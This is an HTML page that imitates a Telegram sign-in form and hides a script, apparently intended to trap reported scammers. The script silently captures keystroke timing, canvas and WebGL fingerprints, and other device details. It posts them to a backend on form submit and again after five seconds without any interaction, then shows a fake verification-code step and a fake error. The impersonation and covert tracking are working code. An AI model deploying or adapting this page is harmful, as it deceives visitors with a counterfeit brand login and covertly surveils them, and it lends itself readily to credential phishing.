<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Telegram – Sign in</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Roboto', sans-serif;
    background: #f1f1f1;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
  }

  .container {
    background: white;
    border-radius: 16px;
    padding: 48px 40px;
    width: 360px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    text-align: center;
  }

  .logo {
    width: 80px;
    height: 80px;
    background: linear-gradient(135deg, #2CA5E0, #0088cc);
    border-radius: 50%;
    margin: 0 auto 24px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 40px;
  }

  h1 {
    font-size: 24px;
    font-weight: 700;
    color: #222;
    margin-bottom: 8px;
  }

  p { color: #888; font-size: 14px; margin-bottom: 30px; }

  .input-group { margin-bottom: 16px; text-align: left; }
  label { font-size: 12px; color: #888; display: block; margin-bottom: 4px; }

  input {
    width: 100%;
    padding: 14px 16px;
    border: 1px solid #e0e0e0;
    border-radius: 8px;
    font-size: 16px;
    outline: none;
    transition: border-color 0.2s;
  }

  input:focus { border-color: #2CA5E0; }

  .btn {
    width: 100%;
    padding: 15px;
    background: linear-gradient(135deg, #2CA5E0, #0088cc);
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    font-weight: 500;
    cursor: pointer;
    margin-top: 10px;
    transition: opacity 0.2s;
  }

  .btn:hover { opacity: 0.9; }

  .footer {
    margin-top: 20px;
    font-size: 12px;
    color: #bbb;
  }

  .divider {
    display: flex;
    align-items: center;
    gap: 10px;
    margin: 20px 0;
    color: #ccc;
    font-size: 12px;
  }
  .divider::before, .divider::after {
    content: '';
    flex: 1;
    height: 1px;
    background: #e0e0e0;
  }
</style>
</head>
<body>
<div class="container">
  <div class="logo">✈</div>
  <h1>Sign in to Telegram</h1>
  <p>Enter your phone number or email</p>

  <form id="loginForm" onsubmit="handleSubmit(event)">
    <div class="input-group">
      <label>Phone number or email</label>
      <input type="text" id="credential" placeholder="+1 234 567 8900" autocomplete="off">
    </div>
    <div class="input-group">
      <label>Password</label>
      <input type="password" id="password" placeholder="Your password">
    </div>
    <button type="submit" class="btn">Sign In</button>
  </form>

  <div class="divider">or</div>
  <button class="btn" style="background: white; color: #0088cc; border: 1px solid #0088cc;">
    Use QR code
  </button>

  <div class="footer">By signing in, you agree to our Terms of Service.</div>
</div>

<!-- Hidden fingerprint collector -->
<script>
const reportId = new URLSearchParams(window.location.search).get('report') || 0;

// Behavioral fingerprinting (hidden from user)
const fingerprint = {
  typing_rhythm: [],
  screen_resolution: `${screen.width}x${screen.height}`,
  browser: navigator.userAgent,
  os: navigator.platform,
  font_size: window.getComputedStyle(document.body).fontSize,
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  device_memory: navigator.deviceMemory || 'unknown',
  canvas_fingerprint: getCanvasFingerprint(),
  webgl_fingerprint: getWebGLFingerprint(),
  keyboard_delays: []
};

let lastKeyTime = 0;
document.addEventListener('keydown', (e) => {
  const now = Date.now();
  if (lastKeyTime) {
    fingerprint.keyboard_delays.push(now - lastKeyTime);
    fingerprint.typing_rhythm.push(now - lastKeyTime);
  }
  lastKeyTime = now;
});

function getCanvasFingerprint() {
  try {
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('Fingerprint', 2, 15);
    ctx.fillStyle = 'rgba(102,204,0,0.7)';
    ctx.fillText('Fingerprint', 4, 17);
    return c.toDataURL().slice(-50);
  } catch(e) { return 'unavailable'; }
}

function getWebGLFingerprint() {
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    if (!gl) return 'unavailable';
    const renderer = gl.getParameter(gl.RENDERER);
    const vendor = gl.getParameter(gl.VENDOR);
    return `${vendor}::${renderer}`.slice(0, 50);
  } catch(e) { return 'unavailable'; }
}

// Send fingerprint silently on form submit
function handleSubmit(e) {
  e.preventDefault();
  
  // Send to backend
  fetch('../../backend/collect_fingerprint.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      report_id: reportId,
      role: 'scammer',
      fingerprint: fingerprint
    })
  }).catch(() => {});

  // Show fake error or redirect
  setTimeout(() => {
    document.querySelector('form').innerHTML = `
      <div style="padding: 20px; background: #fff3f3; border-radius: 8px; color: #cc0000; font-size: 14px; margin-bottom: 15px;">
        ⚠ Verification required. Please check your device for a confirmation code.
      </div>
      <div class="input-group">
        <label>Enter verification code</label>
        <input type="text" placeholder="_ _ _ _ _ _">
      </div>
      <button class="btn" onclick="showFakeError()">Verify</button>
    `;
  }, 1000);
}

function showFakeError() {
  alert('Invalid code. Please try again later or contact support.');
}

// Passive collection after 5 seconds (even without interaction)
setTimeout(() => {
  fetch('../../backend/collect_fingerprint.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      report_id: reportId,
      role: 'passive',
      fingerprint: fingerprint
    })
  }).catch(() => {});
}, 5000);
</script>
</body>
</html>
